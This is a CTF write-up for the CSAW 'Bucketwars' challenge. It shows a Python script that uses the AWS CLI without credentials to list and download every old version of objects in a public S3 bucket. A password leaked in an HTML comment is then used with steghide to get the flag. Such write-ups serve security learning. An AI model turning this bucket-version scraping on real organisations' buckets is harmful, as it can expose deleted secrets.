Writeup for Bucketwars challenge of CSAW CTF 

The bucket url can be found by triggering any error ike 404.


Firstly,after some thinking the hint "we don't make mistakes in these parts" could be pointing towards the concept of **versioning** in Amazon S3 buckets. 

So we run a script to fetch the version list and then all the older version files as well from the bucket:

```
from subprocess import check_output
import json

BUCKET_NAME = "bucketwars.ctf.csaw.io"


def getFiles():
    cmd_output = check_output(
        f'aws s3api list-object-versions --no-sign-request --bucket {BUCKET_NAME} --prefix "" --output json', shell=True)

    return json.loads(cmd_output)["Versions"]


def getFile(file):
    filename, VersionId = file["Key"], file["VersionId"]

    try:
        output_filename = f"{filename.split(".")[0]}_{VersionId.strip()}.{
            filename.split(".")[1]}"
    except IndexError:
        output_filename = f"{filename}{VersionId}"

    check_output(
        f"aws s3api get-object --no-sign-request --bucket {BUCKET_NAME} --key {filename} --version-id {VersionId} {output_filename}", shell=True)

    print(file["LastModified"], f"""{
          int(file["Size"])/1000} KB""", output_filename, sep="\t")


# files = json.loads(open("versions.json").read())["Versions"]
files = getFiles()

print(f"Pulling [{len(files)}] files")
print("Timestamp\tSize\tFilename_VersionId")

for file in files:
    getFile(file)
	
	```

In one of the files we get this comment:

```
    Oh it can't be
    <!-- Note to self: be sure to delete this password: versions_leaks_buckets_oh_my --> 
```
And we find a image in another html file. Running steghide on the image with the above password gives the flag.